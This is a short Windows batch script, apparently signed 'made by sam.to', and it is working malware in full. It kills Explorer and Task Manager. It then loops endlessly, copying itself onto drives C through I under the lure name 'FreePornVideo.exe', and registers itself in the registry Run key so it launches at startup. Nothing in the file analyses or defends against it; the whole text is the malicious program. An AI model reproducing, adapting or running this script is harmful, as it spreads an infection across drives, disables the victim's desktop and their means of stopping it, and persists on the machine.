@shift
@taskkill /im explorer.exe /f
@taskkill /im taskmgr.exe /f
:samto
@copy "%0" "E:\FreePornVideo.exe"
@copy "%0" "H:\FreePornVideo.exe"
@copy "%0" "C:\FreePornVideo.exe"
@reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Sam.to /t REG_SZ /d

"C:\FreePornVideo.exe"
@copy "%0" "F:\FreePornVideo.exe"
@copy "%0" "I:\FreePornVideo.exe"
@copy "%0" "D:\FreePornVideo.exe"
@copy "%0" "G:\FreePornVideo.exe"
@ping 127.0.0.1 -n 100
@goto samto
@REM made by sam.to
